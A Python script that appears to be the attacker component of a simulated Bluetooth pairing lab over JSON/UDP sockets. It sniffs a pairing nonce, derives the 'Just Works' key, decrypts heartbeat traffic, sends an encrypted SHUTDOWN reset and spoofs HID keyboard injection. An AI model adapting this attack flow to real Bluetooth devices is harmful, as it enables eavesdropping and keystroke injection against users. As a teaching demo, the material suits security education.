import bt_common as bt
import time, json, socket

print("--- ATTACKER (ACTIVE & PASSIVE) ---")
sock = bt.get_sock()
TARGET = "HEADPHONES_v1"
potential_key = None 

try:
    # 1. Listen for the initial handshake to steal the nonce
    print("[*] Waiting for pairing handshake...")
    is_passkey_mode = False

    while not potential_key:
        try:
            data, _ = sock.recvfrom(1024)
            msg = json.loads(data.decode())
            
            if msg['type'] == "ADVERTISE" and msg['data']['mode'] == "passkey":
                is_passkey_mode = True

            if msg['type'] == "PAIR_REQ" and msg['data']['target'] == TARGET:
                captured_nonce = msg['data']['nonce']
                
                if is_passkey_mode:
                    print(f"[!] Target is using PASSKEY mode. Nonce {captured_nonce} is useless without the 6-digit code.")
                    print("[*] Attempting brute force or waiting for user error...")
                    # For demo purposes, we'll stop here or assume failure
                    break 
                else:
                    potential_key = bt.get_hash("000000", captured_nonce)
                    print(f"[PASSIVE] Just Works detected. Nonce: {captured_nonce}. Key derived!")
        except socket.timeout:
            continue
        except Exception as e:
            print(f"Error: {e}")

    # 2. Monitor a few heartbeats
    captured_count = 0
    while captured_count < 7: # 10-3
        try:
            data, _ = sock.recvfrom(1024)
            msg = json.loads(data.decode())
            if msg['type'] == "HEARTBEAT" and msg['from'] == TARGET:
                if potential_key:
                    dec = bt.crypt(msg['data']['payload'], potential_key)
                    print(f"[PASSIVE] Decrypted traffic: {dec}")
                    if captured_count > 7: captured_count = 10
                else:
                    # Show the "Garbled" ciphertext since we don't have the key
                    raw_hex = msg['data']['payload'].encode().hex()[:20]
                    print(f"[PASSIVE] Encrypted traffic (Unknown Key): {raw_hex}...")
                captured_count += 1
        except socket.timeout:
            continue

    # 3. Active Takeover
    # Use the best available key (real one from Just Works or dummy for Passkey)
    attack_key = potential_key if potential_key is not None else "00000000000000000000000000000000"

    print("\n[ACTIVE] Attempting Protected Protocol RESET...")
    # Encrypt the SHUTDOWN command
    protected_reset = bt.crypt("SHUTDOWN", attack_key)
    bt.send_msg(TARGET, "RESET", {"payload": protected_reset})
    time.sleep(1)

    print("[ACTIVE] Spoofing HID Keyboard to Computer...")
    for i in range(3):
        time.sleep(1)
        payload = bt.crypt("You've been hacked!", attack_key)
        bt.send_msg(TARGET, "HEARTBEAT", {"gatt": "HID_KEYBOARD", "payload": payload})
        print(f"   [TX] Malicious Packet {i+1} sent.")
    
    print("[ACTIVE] Injection Complete. Attacker exiting.")

except KeyboardInterrupt:
    pass
print("Attacker Offline.")